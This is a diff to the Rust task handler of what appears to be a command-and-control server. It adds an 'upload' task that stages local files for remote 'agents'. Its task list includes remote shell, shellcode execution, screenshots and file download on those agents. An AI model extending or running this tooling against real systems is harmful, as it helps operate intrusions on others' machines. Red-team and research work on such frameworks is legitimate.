@@ -1,12 +1,11 @@
 use axum::extract::ws::{Message, WebSocket};
-use chrono::{Datelike, Timelike};
 use log::{error, info, warn};
 use std::{
+    fs,
     io::{Error, ErrorKind},
-    sync::Arc,
 };
 use tokio::{
-    sync::{Mutex, MutexGuard},
+    sync::MutexGuard,
     time::Duration,
 };
 
@@ -33,6 +32,61 @@ pub async fn handle_task(
     match task {
         "cat" | "cd" | "cp" | "download" | "info" | "ls" | "mkdir" | "net" | "ps" | "pwd" |
         "rm" | "screenshot" | "shell" | "shellcode" | "sleep" | "whoami" => {
+            match set_task(&args) {
+                Ok(_) => {},
+                Err(e) => {
+                    let _ = socket_lock.send(
+                        Message::Text(
+                            format!("[task:error] Could not set the task: {}", e.to_string())
+                        )).await;
+                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
+                    return;
+                }
+            }
+
+            check_task_result(
+                socket_lock,
+                ag_name.to_string(),
+                task.to_string(),
+                check_sleeptime,
+                max_check_cnt,
+            ).await;
+        }
+        "upload" => {
+            let file_path = args[3].to_string();
+
+            let content = match fs::read(file_path.to_string()) {
+                Ok(c) => c,
+                Err(e) => {
+                    let _ = socket_lock.send(
+                        Message::Text(
+                            format!("[task:error] Error: {}", e.to_string())
+                        )).await;
+                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
+                    return;
+                }
+            };
+
+            let file_name = file_path.split("/").last().unwrap();
+            match write_file(
+                format!(
+                    "agents/{}/uploads/{}",
+                    ag_name.to_string(),
+                    file_name.to_string()
+                ),
+                &content,
+            ) {
+                Ok(_) => {},
+                Err(e) => {
+                    let _ = socket_lock.send(
+                        Message::Text(
+                            format!("[task:error] Could not set the task: {}", e.to_string())
+                        )).await;
+                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
+                    return;
+                }
+            }
+
             match set_task(&args) {
                 Ok(_) => {},
                 Err(e) => {
